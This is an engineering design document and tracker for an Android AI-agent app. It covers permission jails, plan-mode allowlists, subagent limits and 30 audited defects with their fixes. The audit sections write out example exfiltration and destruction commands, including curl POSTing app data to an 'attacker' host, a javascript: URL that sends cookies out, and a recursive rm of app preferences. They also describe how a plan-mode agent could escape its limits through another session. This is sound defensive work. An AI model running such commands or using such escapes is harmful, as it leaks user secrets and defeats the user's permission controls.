# Strict Permissions & Defect Closure — Design + Living Tracker

Date: 2026-09-24
Branch: `hoplite/gortyn-77773150`
Baseline commit: `cfc44f0` ("fix: accessibility survives app restart")
Status: **IN PROGRESS** — this document is the living tracker. The status table at
the bottom is updated as each phase lands.

---

## 1. Scope

Twelve workstreams requested by the owner in one pass:

1. Accessibility service dead after app restart (still broken after `cfc44f0`).
2. Studio screen loses its GitHub login after reopening the app.
3. Repo label: chatbox must show the **repo name**, never `owner__repo__branch`;
   sidebar shows no repo label.
4. Global clone **exactly once**, from the branch first selected in Studio; the
   agent must never re-clone per new session.
5. Browser desktop mode must change real **width and height**, not just the UA.
6. Strict permission model: per-mode filesystem jail, exactly three approval
   options (Allow / Deny / Always Allow), no cross-mode leakage, one JSON store
   per mode.
7. Plan mode must be plan-only — no deletes, no dangerous tools — DSH-style.
8. Subagents: up to 49 concurrent per session, hard cap, and a subagent must
   never spawn a subagent.
9. Codex plugins **and** Codex MCP must work, at parity with Claude Code.
10. Queued-message box is too tall; height must auto-adjust to text lines.
11. Nine Settings rows to remove (feature kept, row hidden).
12. A minimum of 15 real bugs found and fixed (security / production / UI-UX /
    performance). 30 were confirmed; all are listed in §4.

Deferred: the owner's Google Doc error list (no URL is present anywhere in the
repo or in the conversation). Phase 12 is a placeholder until it is supplied.

---

## 2. Locked decisions

| # | Decision | Owner's answer |
|---|---|---|
| D1 | Google Doc items | **Skip for now** — Phase 12 deferred until the URL is provided. |
| D2 | Browser desktop approach | **Both: real geometry now (Phase 4a), CDP later (Phase 4b).** CDP is deferred because it needs `setWebContentsDebuggingEnabled(true)` in release, which is its own security tradeoff. |
| D3 | "Always Allow" scope | **Per-mode AND per-session.** Entries persist across restarts and are removed only when the owning session is deleted. Lookup requires *both* the mode and the session to match. |
| D4 | Read-Only (`AgentMode.safe`) | **Keep.** Plan mode is built on it (`/preset plan` sets `planMode=true` and takes over Read-Only via `planPreMode`). Plan mode is hardened to an allowlist instead. |

---

## 3. Finding #0 — the owner is testing a stale build

**All nine Settings rows in item 11 are already absent at HEAD**, as are the
sidebar repo labels in item 3.

Evidence:

```
grep -c "Auto run safe|GitHub sync|Conversation display|Send while busy|Battery" \
  lib/ui/settings_screen.dart            → 0
git log -S"<row>" -- lib/ui/settings_screen.dart  → deleted in d45f724 (2026-09-24 10:44)
test/session_browser_profiles_test.dart:466-475   → pins absence of the 3 "share" rows
lib/ui/sidebar.dart:199-202              → "the sidebar deliberately shows no repo
                                            or workspace labels (user decision 2026-09-24)"
test/sidebar_no_repo_labels_test.dart    → pins AASHEESH333__OVIDAI__MAIN as findsNothing
```

`d45f724` landed 2026-09-24 10:44 and `cfc44f0` at 11:49. Any installed APK built
before those still shows the old UI. **Phase 0 is therefore blocking**: fixes
verified against a stale build are unverifiable.

Consequence for the plan: item 11 needs no code change, only an on-device
confirmation. Item 3's sidebar half needs no change; only the chatbox chip does.

---

## 4. Root causes

### 4.1 Accessibility dead after restart

`cfc44f0` removed the DISABLE→ENABLE component toggle because, while the
component is disabled, `AccessibilityManagerService` **drops it from
`Settings.Secure ENABLED_ACCESSIBILITY_SERVICES`** and re-enabling does not
restore it (`MainActivity.kt:511-529`). Removing it was correct — it was
permanently disabling the service on every resume. But it left *pure waiting*,
and waiting assumes the OS always rebinds. It does not after a force-stop
(package enters the stopped state; AMS will not restart its services) or on OEM
autostart blockers — the same 14 OEMs the app itself enumerates at
`device_control_service.dart:714-734`.

Compounding defects:

| Defect | Location |
|---|---|
| `deviceServiceState` returns `connecting` forever; cannot distinguish "OS is working" from "OS will never rebind" | `MainActivity.kt:97-100` |
| The only UI that could prompt a toggle checks settings-level `isEnabled()` (returns **true**) instead of `serviceState()` → notice never renders | `chat_screen.dart:7337-7339, 7385` |
| **No cold-start trigger.** `refreshServiceBinding` runs only on `AppLifecycleState.resumed`, which is dispatched *before* `runApp`, so the late-registered observer never receives it. No startup task exists. | `shell.dart:76-83`; `state.dart:2420-2486` |
| Exhaustion copy lies: "it should bind on its own" | `device_control_service.dart:195-199` |
| `android:canTakeScreenshot="true"` missing → `device_screenshot` always fails (the plan template had it; the shipped XML lost it) | `res/xml/ovid_accessibility_service.xml` |
| `reconnectService()` is dead production code (zero callers in `lib/`) | `device_control_service.dart:223-233` |

Ruled out: stale Dart-side `bound` caching. `serviceState()` re-queries native on
every call and `instance` is a process static cleared in `onUnbind`/`onDestroy`.

### 4.2 Studio login lost

Four independent vectors; the first reproduces the reported symptom exactly.

1. **`_persistToken` generation race** (`github_service.dart:302-316`). The write
   runs on a serialized queue *after* `pollForToken`'s staleness check:
   ```dart
   if (generation != null && generation != _authGeneration) return;   // write skipped
   await _secureStorage.write(key: _tokenStorageKey, value: token);
   if (generation != null && generation != _authGeneration) {
     await _secureStorage.delete(key: _tokenStorageKey);              // written token deleted
   }
   ```
   If a queued `github.initialize` bumps `_authGeneration` in between, the fresh
   token is never written, or is written then deleted — while `_setToken()` keeps
   the user looking logged in for that process only. Restart → logged out.
2. **Read failure indistinguishable from "no token"**
   (`github_service.dart:119-134, 148-153`). Three attempts over ~300 ms, then
   treated as absent *for the whole launch*. Nothing re-reads on resume. Android
   Keystore / EncryptedSharedPreferences reads can fail far longer than 300 ms.
   The stored token is not deleted, so the next launch may succeed — matching the
   intermittent report.
3. **`github.initialize` can be skipped.** It is 6th in a sequential readiness
   list; at the 120 s deadline a still-queued task is marked `skipped` and never
   runs (`startup_coordinator.dart:373-386`). Then `_isInitializing` stays true
   and the login sheet is never even offered (`studio_screen.dart:119, 131`).
4. **`deleteAllData()` wipes secure storage without calling `signOut()`**
   (`state.dart:4092`) → memory and disk disagree.

Cosmetic but perceived as logout: the profile (`@login`, avatar) is never
persisted, so the account chip renders empty offline (`studio_screen.dart:1872-1915`).

Not a cause: `shareStudioOnRestart` only backfills `session.repo`/`branch`
metadata (`session_data_sharing.dart:95-136`); it never touches storage.

### 4.3 Chatbox repo label

`chat_screen.dart:6843-6849`:
```dart
final label = hasFolder
    ? folder.split('/').last
    : (hasRepo ? repo.split('/').last : 'sandbox');
```
The folder branch wins, and the folder *is* the registry clone directory
`<owner>__<repo>__<branch>` (`global_repo_registry.dart:173-182`), so the chip
renders `aasheesh333__OvidAI__main`. Fix is a precedence flip.

### 4.4 Global clone-once

| Gap | Location | Effect |
|---|---|---|
| Registry routing requires `mode == AgentMode.studio`, but `newSession()` never sets mode (`ChatSession` defaults `'auto'`) | `agent_service.dart:12886`; `state.dart:1177, 4903-4910` | **Every fresh chat session raw-clones into `ws_<id>`** — the reported "baar baar clone" |
| Branch picker rebinds the API `RepoCache`, never the git clone | `studio_screen.dart:667-670` | A second global clone per branch; file tree and disk diverge |
| `_offerCloneTarget` early-returns whenever a folder is inherited | `studio_screen.dart:191-195` | Switching repo A→B silently keeps working in A's folder |
| `ensureCloned` has no in-flight dedup | `global_repo_registry.dart:252-282` | Two concurrent callers both miss; the second `delete(recursive:true)`s the first's in-flight clone |
| Two disagreeing workspace authorities (registry binding vs pinned `workspaceFolder`) | `agent_service.dart:3445-3461`; `sandbox_service.dart:279-317` | agent cwd ≠ terminal cwd; inherited folders have no binding of their own |
| First-selected branch is not recorded per repo | `studio_screen.dart:601-603` | Re-picking resets to `default_branch`, discarding the user's choice |

`a5f6750` only made the clone *work* on Android (sandbox git runner) and added
the agent git tools; it did not touch mode inheritance, branch rebinding,
concurrency, or binding/folder agreement.

### 4.5 Browser desktop mode

**The WebView's real pixel size is never changed.** It is
`Expanded → IndexedStack → WebViewWidget` (`browser_screen.dart:375-393`),
hard-constrained to the phone screen by the Flutter layout, and webview_flutter
sizes the native view to the widget's layout size. What "desktop mode" does
instead: UA string, client hints, a JS shim faking `innerWidth`/`screen.*`, and
an injected `<meta viewport width=1280>`.

Why that cannot work:

- CSS media queries, `vw`/`vh` and container queries read the **real layout
  viewport**. JS getters cannot fake it, so the shim is cosmetic.
- Chromium's rule — acknowledged in the code's own comment at
  `OvidWebViewHandler.kt:354-356` — is *"last meta wins"*: the page's own
  `width=device-width` beats the injected meta.
- **First-match shadowing bug.** `apply()` uses `querySelector` (first match).
  Document-start injects a meta before `<head>`, so it is forever first; every
  later re-apply hits the `content === 'width=1280'` guard and **no-ops**
  (`OvidWebViewHandler.kt:364-378`).
- The "repair" re-evaluates **the same no-op script** and returns `applied: true`
  (which only means "WebView found, script evaluated"). `_verifyDesktopForced`
  **never re-probes after repair** (`agent_service.dart:2734-2749`), so the console
  logs *"desktop force repaired: layout 1280px re-applied"* while the page is
  still phone-width.
- **Height is never forced at all** — admitted at `agent_service.dart:2641-2645`.
- `devicePixelRatio` is not spoofed; `loadWithOverviewMode=true` (since `d45f724`)
  makes even a successful force render at ~28% scale — the exact "tiny content"
  the spec forbade (`specs/2026-09-10-browser-desktop-design.md` §5.1).

Test coverage gives false confidence: all 12 browser tests are mock-channel or
source-string pins; none asserts a rendered width.
`audits/2026-09-10-browser-desktop.md` §7 records *"Device checks were NOT
executed."*

**Chosen fix (D2):** give the WebView real geometry — `SizedBox(1280×800)` inside
a fit-to-view scale / `InteractiveViewer`. The native view is then laid out at
1280×800 logical px, so `width=device-width` resolves to 1280 and media queries,
`innerWidth`, `vh`, `visualViewport` all become genuinely desktop with **no JS
fakery**. The meta-injection, shim, verifier and repair machinery are deleted.

### 4.6 Permission model

`PermissionGrant` is `kind (path|host) × scope (session|global)`. **There is no
mode dimension and no persisted deny** — `grant_store.dart:15-16` states *"A Deny
is never recorded"*. Storage is the session JSON `grants` key plus one app-wide
pref `ovid_permission_grants_v1`.

| Gap | Location |
|---|---|
| Approval card renders **4 actions + 2 scope chips** (Deny-with-note icon, Deny, Allow, Always Allow, `This session`/`All sessions`). Target is exactly 3. | `chat_screen.dart:6351-6425` |
| `permissionWorkspaceRoot()` is a **stub that ignores `modeName`** and returns `sessionWorkDir` | `grant_store.dart:390-396` |
| **Control mode has no jail** — treated identically to Full Access | `agent_service.dart:13303-13306, 13500, 13637-13639` |
| Cross-mode leakage: switching a session's mode leaves `s.grants` untouched; global grants apply to every session in every mode; `_alwaysAllowedTools` is keyed by session only | `agent_service.dart:788-807, 4145, 13250` |
| `checkPolicy` jails **cwd only, never command targets**; `policy.allowedRoots` is never assigned anywhere | `sandbox_service.dart:2407-2445` |
| A user-pinned `workspaceFolder` may point anywhere and becomes the jail root with zero prompts | `agent_service.dart:3445-3461` |

Reusable as-is: `normalizeGrantPath` and `pathCoveredBy` (segment-boundary prefix
match, so `/a/b` covers `/a/b/c` but not `/a/bc`) — this already implements
"Always Allow = that directory and all its children".

### 4.7 Plan mode

`_mutatingTools` (`agent_service.dart:15997-16056`, enforced at `:10619`) is a
**blocklist**, which fails *open*: any tool added later is automatically allowed
while planning. DSH-style plan-only needs an allowlist (default-deny).

Concrete leaks — all run freely in plan mode today:

- `browser_open`, `browser_navigate`, `browser_new_tab`, `browser_close_tab`,
  `browser_switch_tab`, `browser_resize`, `browser_scroll`, `browser_back`,
  `browser_forward`, `browser_reload`, `browser_hover` — only the
  click/type/evaluate family is blocked. A planning agent opens and **closes the
  user's tabs**, navigates live pages, and gets unrestricted network egress.
  Combined with the `javascript:` hole (§4.9 #6) that is script execution while
  "planning".
- `interrupt_agent`, `send_message` — a plan-mode agent can stop or steer
  **another session**, which is not in plan mode, and have it perform the
  mutation. Indirect escape.
- `todo_write` is blocked, although in DSH the plan artifact is the point of plan
  mode.

### 4.8 Subagents

- **No concurrency cap exists anywhere.** Background dispatch
  (`agent_service.dart:17533-17541`) never counts anything; `_runs` is unbounded.
  The only numeric limits are depth 2 (`:16431`), workflow 6 tasks/phase and 12
  phases (`:17604-17624`), ralph 50 sequential rounds (`:17681-17684`).
- **Nesting is live.** The child's roster still contains `dispatch_agent`,
  `workflow` and `ralph` (`_tools`, `:4473-4711`, has no subagent filter) and
  `_childDeniedTools` (`:7869-7873`) does not list them. A child at depth 1
  passes `1 < 2` and **spawns a grandchild**. Only the depth cap prevents
  unbounded recursion.
- **Enabling structure:** `_handleDispatchAgent` has no `await` between the depth
  check and `_subagents[id] = sub` (`:17471-17507`); same in `_spawnChild`
  (`:17557-17581`). In a single isolate a count check inside that window is
  atomic — no overshoot even on a 6-way workflow fan-out.
- **Hazards at 49:** main-isolate saturation (49 SSE streams, no `Isolate.run`
  anywhere); 49 × `Timer.periodic(900ms)` each calling global
  `AppState.refresh()`; full-blob SharedPreferences rewrites; the
  `SessionLedger` first-write sink race leaking **one FD per fresh child**
  (`session_ledger.dart:71-79`); shared-workspace write races; provider 429
  retry storms.

### 4.9 Confirmed defects (30)

**CRITICAL**

1. **GitHub OAuth token in the env of every sandbox process.**
   `sandbox_service.dart:2090-2098`, merged into every exec (`:2492`) and spawn
   (`:3446`) — agent shell, Studio terminal, MCP stdio servers, plugin hooks.
   ```dart
   env['GIT_CONFIG_VALUE_0'] =
       '!f() { echo username=x-access-token; echo password=$token; }; f';
   ```
   `printenv GIT_CONFIG_VALUE_0` puts the raw token into tool output → transcript
   → persisted session JSON → the LLM provider. Duplicated at
   `global_repo_registry.dart:226` and `studio_screen.dart:318-319`.
2. **Read-Only mode auto-runs `printenv`/`env`** with zero prompts
   (`agent_service.dart:13162-13163, 13645-13651`; default ON at
   `state.dart:4267`) — dumping #1 in the mode advertised as the safe one.
3. **`curl -s` whitelisted as "read-only"** (`agent_service.dart:13193`, prefix
   match at `:13212-13238`) → `curl -s -X POST -d @../../shared_prefs/…
   https://attacker/` auto-runs. Shell egress never reaches `_checkHostGrant`.

**HIGH**

4. Path jail checks cwd only, and the deny regexes cannot match long options, so
   `rm --recursive --force ../../shared_prefs` wipes app data with no prompt in
   General mode (`sandbox_service.dart:2414-2445, 2393-2405`; token extractor only
   takes `startsWith('/')` at `agent_service.dart:13437`).
5. SSRF: loopback in `defaultAllowedHosts` (`grant_store.dart:380-382`);
   drive/control allow **all** hosts (`agent_service.dart:13500`); `followRedirects`
   defaults true and redirects are never re-checked.
6. `javascript:`/`data:` URLs skip the host grant and go straight to
   `loadRequest` (`agent_service.dart:10873-10890`) → cookie theft in a
   previously-granted origin.
7. Cross-session cookie merge defaults **ON** (`state.dart:3046`), contradicting
   `OvidWebViewHandler.kt:186-189` (*"a login in one session is invisible from
   another"*).
8. `SessionLedger` leaks FDs twice: the first-write race orphans a sink
   (`session_ledger.dart:71-79`); `close()` calls `flush()` not `close()`, then
   deletes the file (`:159-170`).
9. **Approvals from background sessions are never rendered.** `pendingApproval`
   is per-run-bucket; the dock reads only the active session's
   (`chat_screen.dart:6295`). Every permissioned tool in a parallel session stalls
   120 s then auto-denies — though "10+ sessions can run at once" is a documented
   feature (`agent_service.dart:811-814`).

**MEDIUM**

10. Browser auto-answers every `window.confirm()` with `true`, including on pages
    the user browses manually (`agent_service.dart:2960-2967`).
11. Any custom-scheme deep link is fired to the OS from page JS with no gesture
    check (`agent_service.dart:3042-3052`).
12. Boot receiver plus a renewable **6-hour partial wake lock**, keep-alive
    default ON (`BootReceiver.kt:23-38`, `AgentForegroundService.kt:100-121`).
13. Tool `.timeout()` abandons but does not cancel → duplicate mutating
    executions (`agent_service.dart:8810-8818`).
14. `approvalUiReady` is one global static toggled by initState/dispose →
    navigation overlap silently drops approvals to 5-second auto-deny
    (`chat_screen.dart:889-905`).
15. Reminder engine force-switches the visible session and starts a run from a
    1 Hz background timer (`agent_service.dart:16371-16419`).
16. `setState` after `await` with no `mounted` guard
    (`chat_screen.dart:6202-6204`; `health_screen.dart:40-43` checks `mounted` one
    line too late).
17. `browser_navigate` force-unwraps `tab.controller!` after a fixed 2 s sleep
    (`agent_service.dart:10955-10959`); `browser_open` also fetches every page
    twice (`:10896`).
18. Three `TextEditingController`s created for dialogs, never disposed
    (`sidebar.dart:580`, `settings_screen.dart:1559-1563`, `chat_screen.dart:5155`).
19. `rememberOrigin` read-modify-write race loses visited origins
    (`session_browser_profiles.dart:409-423`).

**PERFORMANCE**

20. Every streamed token calls global `AppState.refresh()` → `main.dart:40-50`
    does a full `setState` and `Aether.theme()` allocates a fresh `ThemeData`,
    invalidating the whole `MaterialApp` per token; `_liveMsg!.content =
    _liveContent.toString()` is O(n²) over a long reply
    (`agent_service.dart:10013-10022`).
21. Whole-blob persistence: every write re-encodes **all** sessions
    (`state.dart:3891-3909`); `usageLog` re-encodes 2000 entries per LLM call and
    is never trimmed in memory (`:5384-5402`).
22. Subagent mirror: unbounded `toolDetail` growth (no 12k trim, unlike
    `:14229-14234`), re-split on **every build**.
23. Sync file IO inside `build()` (`existsSync`/`lengthSync`) and `Image.file`
    with no `cacheWidth` on up-to-16 MB generated images
    (`chat_screen.dart:4225-4248`).
24. `.spill` tool-output files and `device-captures` screenshots are **never
    deleted** — Control mode leaves full-screen PNGs of *other apps* on disk
    indefinitely (`agent_service.dart:338-351, 15452-15470`;
    `OvidAccessibilityService.kt:1507-1512`).
25. Studio terminal `history` grows without bound (`studio_terminal.dart:22,42,49`).

**UI/UX**

26. Hinglish in security-critical consent dialogs: `'AI ko device permission
    chahiye'`, `'Browser panel me ye page khulega'`, `'Settings me timeout
    badhayein'` (`agent_service.dart:10824-10827, 10846, 10931, 10968,
    9758-9761`).
27. Five tap targets far below 48 dp — worst is the browser tab-close, a
    **12×12 dp** `Icon(size:12)` GestureDetector 5 px from the tab body
    (`browser_screen.dart:235-245`); also `chat_screen.dart:4309-4320,
    2895-2900, 6209-6216`, `sidebar.dart:633-668`.
28. `_AgentDot` conveys busy/ready by colour only, no Tooltip or Semantics
    (`browser_screen.dart:409-436`).
29. Rename dialog `TextField` has no `textInputAction`/`onSubmitted` — Enter is a
    dead end (`sidebar.dart:588-592`).
30. **Queue dock too tall** (owner complaint): the rows region is capped at **38%
    of viewport** (`chat_screen.dart:5991-5992`) and each `_QueueAction` adds
    `vertical: 12` padding (`:6180`), so a single one-line queued message costs
    ~104 dp.

Verified clean, to bound the list: provider keys, the GitHub token, MCP env
secrets and native-plugin `secret` fields **are** in hardened
`FlutterSecureStorage`; the manifest has `allowBackup=false`, cleartext off,
non-exported FileProvider and services, no `addJavascriptInterface`, no
`onReceivedSslError` override and no TLS-disabling callbacks; plugin archive
extraction properly rejects absolute/`..`/symlink-escape entries.

### 4.10 Codex parity

| Capability | Claude Code | Codex | Evidence |
|---|---|---|---|
| Plugin discovery / manifest / install | works | **works** | `plugin_adapters.dart:819-993`, behavior-tested |
| Hooks | works | **partial** — `_parseCodexInlineHooks` has zero tests, misses quoted keys | `plugin_adapters.dart:377-419` |
| MCP config parse (TOML) | n/a | **parser exists but is orphaned** | `mcp_config_parse.dart:378-534` |
| `~/.codex/config.toml` ingestion | n/a | **missing** — the string appears nowhere in `lib/` | — |
| Paste/import config UI | dead code | **missing** — `PastedConfigPluginSource` has zero production callers | `plugin_source_resolver.dart:799-823` |
| `commands/`, `agents/` dirs | works | **missing** | `plugin_adapters.dart:911-936` vs `:658-660` |
| `AGENTS.md` injection | n/a | **missing** — collected into `instructionPaths`, never consumed | `plugin_adapters.dart:894-899` |
| Marketplace `.codex*` path | works | **missing** | `state.dart:5810-5816` |

Also: no TOML package in `pubspec.yaml` (all hand-rolled; the MCP parser has no
`[[array.of.tables]]` support); `McpService.connect` never calls
`unsupportedTransportReason`, so Codex `type = "streamable-http"` falls into stdio
and dies with *"declares no command"* (`mcp_service.dart:582-625, 835-846,
1775-1779`); `runtimeKindForCommand` knows only node/python/git (`:792-805`);
`importMcpFromSettings` is **dead code** and JSON-only (`state.dart:6665-6726`);
the legacy install allowlist filters out **every** Codex file
(`state.dart:6001-6008`).

Platform reality: on Android `HOME` is the sandbox home
(`sandbox_service.dart:2034-2035`), which never contains `.codex/` — no Codex CLI
runs on-device, so nothing exists to read even if a reader were added. Ingestion
must therefore target a user-supplied config (paste/import) and the workspace,
not `~/.codex`.

False-confidence tests: `settings_mcp_and_legacy_hooks_test.dart:157-239` tests a
function with no production caller; `plugin_runtime_skills_test.dart:532-551`
**actively pins the gap** (asserts `.codex/agents` must not mount).

---

## 5. Design

### 5.1 Permission model (target)

**Modes and roots.** `permissionWorkspaceRoot` becomes real and mode-conditional:

| Mode | Root (jail) | Outside-root behaviour |
|---|---|---|
| `safe` (Read-Only) | session workspace | 3-option prompt; mutating tools hard-blocked |
| `auto` (General) | isolated `workspaces/ws_<sandboxId>` + children | 3-option prompt |
| `studio` | the registry clone for the first-selected repo+branch, + children | 3-option prompt |
| `control` | current session dir + children | 3-option prompt |
| `drive` (Full Access) | none | no prompts |

A user-pinned `workspaceFolder` no longer silently becomes the jail root in
non-Studio modes; it is treated as an outside path requiring a grant.

**Grant record.**
```json
{
  "kind": "path" | "host",
  "value": "/abs/normalized/path",
  "decision": "allow" | "deny" | "always",
  "mode": "auto",
  "sessionId": "…",
  "grantedAt": 1758700000000
}
```

**Stores.** One JSON file per mode under app support:
`grants_safe.json`, `grants_auto.json`, `grants_studio.json`,
`grants_control.json`, `grants_drive.json`. Every entry carries `sessionId`.

**Lookup requires both mode and session to match.** This is decision D3 and it is
what makes cross-mode conflict structurally impossible: a session that switches
Studio→General consults a different file, and its Studio entries are tagged with
a mode that no longer applies. Entries persist across restarts (they are files)
and are purged by `onSessionDeleted`.

**Evaluation order** for a candidate path in mode M, session S:
1. Inside the mode root → allow, no prompt.
2. `drive` → allow, no prompt.
3. A `deny` entry matching (M,S) → refuse, no prompt.
4. An `always` entry matching (M,S) → allow, no prompt.
5. Otherwise → prompt with exactly three options.

`Deny` now persists as a real record (it never did), so step 3 is new. Denying
still returns the existing structured `ACCESS_DENIED:` message instructing the
model to explain why it needed the path and ask what to do next.

**Approval card** becomes exactly three actions — `Deny`, `Allow`,
`Always Allow`. The Deny-with-note icon button and both scope chips are removed.
`allowAlways` is forced true on every grant card. `_PlanReviewCard` (Approve /
Decline / Chat about it) is a different card and is unchanged.

**Path jail becomes target-based.** `checkPolicy` gains real target canonicalization:
relative tokens are expanded against cwd, symlinks resolved, and anything outside
the roots denied. The deny regexes are extended to long options (`--recursive`,
`--force`), and any `rm` with recursive semantics is treated as destructive
regardless of target form.

### 5.2 Plan mode (target)

Replace `_mutatingTools` (blocklist) with `_planModeAllowedTools` (allowlist,
default-deny):

`file_read`, `fs_view`, `fs_glob`, `fs_grep`, `git_status`, `git_log`, `git_diff`,
`fetch_url`, `browser_read`, `browser_list_tabs`, `browser_find`,
`browser_wait_for`, `memory_search`, `ask_user_question`, `exit_plan_mode`,
`todo_write`, `list_agents`, `skill`, `memory_search`.

Everything else — including all `browser_*` mutators, `interrupt_agent`,
`send_message`, and any tool added in future — is refused with the existing
instructive message. `todo_write` moves from blocked to allowed because the plan
artifact is the point of plan mode.

### 5.3 Browser desktop (target)

```dart
LayoutBuilder(builder: (context, box) {
  if (!t.desktopMode) return WebViewWidget(…);          // phone-size, unchanged
  const W = 1280.0, H = 800.0;
  final s = math.min(box.maxWidth / W, box.maxHeight / H);
  return ClipRect(child: InteractiveViewer(
    child: Transform.scale(scale: s, alignment: Alignment.topLeft,
      child: SizedBox(width: W, height: H, child: WebViewWidget(…))),
  ));
});
```

Retained: desktop UA and client hints. Deleted: `viewportScript`, the document-start
meta injection, `desktopFeatureShim`, `repairDesktop`, `_verifyDesktopForced` and
the Dart verifier budget. `useWideViewPort` stays true; `loadWithOverviewMode`
becomes irrelevant because the view really is 1280 wide.

### 5.4 Subagents (target)

`static const _maxConcurrentSubagents = 49;` plus
`int get _liveSubagents => _subagents.values.where((s) => !s.finished).length;`
(per-parent count for the per-session cap, global count for the hard ceiling).
Enforced inside the existing no-`await` window at all three spawn sites:
`_handleDispatchAgent`, `_spawnChild`, `continueSubagent`.

Zero nesting, three independent layers: `isSubagent` refusal at the spawn sites;
roster stripping in `_tools`; the three spawn tools added to `_childDeniedTools`.
`_maxSubagentDepth` stays as defence-in-depth.

Restored handles are `finished = true`, so cold-resume rows never consume budget.

### 5.5 Queue dock (target)

Rows keep auto-sizing to their text (the owner's "height auto-adjusts per text
lines", and the existing `maxLines == null` contract). The *chrome* shrinks: the
scroll cap drops from 38% to ~22% of viewport, and `_QueueAction` keeps a 48 dp
**wide** hit area while its vertical padding drops so a one-line row is compact.
A `minHeight` of 48 dp on the hit target is preserved via `HitTestBehavior` +
`constraints`, not visual padding.

---

## 6. Phase plan

| Phase | Content |
|---|---|
| **0** | Baseline: build + install from `cfc44f0`; confirm on-device that the 9 rows and sidebar labels are already gone; re-test items 1, 2, 5 on that build. **Blocking.** |
| **1** | Security criticals — defects #1–#12 |
| **2** | Strict permission model (§5.1) |
| **3** | Studio login + clone-once + repo label (§4.2–§4.4) |
| **4a** | Browser desktop real geometry (§5.3) |
| **4b** | *Deferred* — CDP `Emulation.setDeviceMetricsOverride` |
| **5** | Accessibility restart (§4.1) |
| **6** | Plan mode → allowlist (§5.2) |
| **7** | Subagents: 49 cap, zero nesting, ledger FD fix first (§5.4) |
| **8** | Codex parity (§4.10) |
| **9** | Correctness & leaks — defects #8, #9, #13–#19 |
| **10** | Performance — defects #20–#25 |
| **11** | UI/UX — defects #26–#30 incl. queue dock (§5.5) |
| **12** | *Deferred* — Google Doc items, pending the URL |

Phases 1 and 2 are deliberately adjacent: both rewrite `_resolveGrantedPath`,
`_maybeApprove` and `_checkHostGrant`, and both touch the ~15 pinned approval
tests. Splitting them across releases means doing that work twice.

**Per-phase gate:** failing tests first (TDD), `dart analyze lib test` at 0
issues, full `flutter test` green, `:app:compileDebugKotlin --offline` when
Kotlin changed, then commit, push, and `gh run watch` to green.

---

## 7. Tests expected to change

| Test | Why |
|---|---|
| `test/tool_approval_always_allow_test.dart` | 4 actions → 3; global-scope semantics replaced by per-mode |
| `test/grant_store_test.dart` | "deny is not persisted" inverts; `permissionWorkspaceRoot` stops ignoring mode; `GrantStore` re-keyed |
| `test/worker_d_grant_store_fixes_test.dart` | new `decision`/`mode` fields in `fromJson` validation |
| `test/core_regression_test.dart:2930-2940` (DL1), `:2619-2632` (SEC4 source-order), `:5046-5066` (depth cap) | gate/host/depth contracts move |
| `test/browser_desktop_*` (6 files) | the shim/verify/repair machinery they pin is deleted |
| `test/queue_dock_layout_test.dart` | 38% cap → 22% |
| `test/composer_modes_test.dart` | chip label precedence |
| `test/studio_branch_test.dart` | branch pick must now rebind the clone |
| `test/global_repo_registry_test.dart`, `test/git_clone_registry_test.dart`, `test/last_selection_test.dart`, `test/studio_git_reliability_test.dart` | clone-once + binding authority |
| `test/github_login_persistence_test.dart`, `test/studio_login_prompt_test.dart` | read-failure ≠ absent; no latch on failure |
| `test/startup_tasks_test.dart`, `test/startup_coordinator_test.dart` | task order + new accessibility task |
| `test/device_reconnect_test.dart`, `test/p2_control_overlay_test.dart` | new `connecting_stale` state |
| `test/plugin_runtime_skills_test.dart:532-551` | **inverted** — it currently pins the Codex gap as correct |
| `test/settings_mcp_and_legacy_hooks_test.dart` | tests a function with no caller; must gain one |
| `test/token_budget_test.dart:60-117` | root roster must still advertise the spawn tools |
| `test/session_browser_profiles_test.dart` | cookie-merge default flips to off |

---

## 8. Status tracker

Updated as each phase lands.

| Phase | Status | Commit | Notes |
|---|---|---|---|
| 0 — Baseline build | **done** | `cfc44f0` | analyze 0 issues; **2335 tests pass** (1 skipped); CI green on run `35963908982`. On-device confirmation still owed by the owner — the latest APK is produced by every CI run on this branch. |
| 1 — Security criticals | **done** | see below | defects #1 #2 #3 #4(gate) #5(redirect) #6 #7 #10 #11 #12 #26 |
| 2 — Permission model | **done (core)** | see below | per-mode isolation, Control jailed, 3 options exactly; #4's target-canonicalisation and #5's loopback default remain |

### Phase 1 detail — what landed

| # | Defect | Fix |
|---|---|---|
| 1 | GitHub token interpolated into `GIT_CONFIG_VALUE_0`, merged into **every** child process env | Token now lives in `<prefix>/.ovid-git-credentials` (mode 0600); the env value is `store --file=<path>` and carries no secret. New `protectedPaths` + a `checkPolicy` rule refuse any command that names the store. `gitCredentialEnv()` is the single implementation, reused by the registry and Studio clone (two duplicate copies of the secret-handling code removed). Cleared on sign-out and uninstall. |
| 2 | Read-Only mode auto-ran `env` / `printenv` | Both removed from `_readOnlyCommands` — an environment dump is an exfiltration primitive, not a read-only query. |
| 3 | `curl -s` prefix-matched, so `curl -s -X POST -d @FILE https://evil/` auto-ran | `curl -s` and `curl -I` removed; `isReadOnlyCommand` now rejects **any** curl/wget form that is not exactly `<cmd> --version`. |
| 4 | Destructive gate missed long options and relative escapes: `rm --recursive --force ../../shared_prefs` ran unprompted in General mode | Option spelling widened to `-{1,2}` with long names; new agent-layer patterns catch relative `../` escapes and `find … -delete` in any position. The catastrophic list is now **shared** between the sandbox hard-deny list and the agent prompt list so the two gates cannot drift (they were duplicated copies). Relative escapes prompt rather than hard-deny — deleting outside the workspace is the jail's business, and the user gets Allow / Deny / Always Allow. |
| 5 | A granted host could 302 the request to loopback / a private range / cloud metadata; the grant was checked only on the initial URL | `HttpShim.get` gained a per-hop `redirectGuard`: guarded requests set `followRedirects = false` and re-check every `Location` through `_checkHostGrant`, resolving relative targets against the previous hop. `fetch_url` passes the guard. Unguarded callers (provider traffic) keep the old behaviour. **Loopback's silent allow and the drive/control blanket allow are deferred to Phase 2**, which restructures the grant store. |
| 6 | `javascript:` / `data:` / `file:` URLs skipped the host grant and went straight to `loadRequest` — `javascript:fetch('https://evil/'+document.cookie)` ran in a *granted* origin's context | New `_loadableSchemes` allowlist (`http`, `https`, `about`) enforced in `navigateTab`, the single choke point for every navigation including the address bar, plus an explicit model-readable refusal in `browser_open` / `browser_navigate`. The refusal tells the model to involve the user instead of retrying. Local previews are unaffected — they resolve through `_resolveLocalWebTarget` and load via `loadFile`. |
| 7 | Cross-session cookie merge defaulted ON, contradicting the per-session isolation the WebView profiles exist to provide | `shareBrowserOnRestart` now defaults **false** in all three places (field, prefs load, `deleteAllData` reset). |
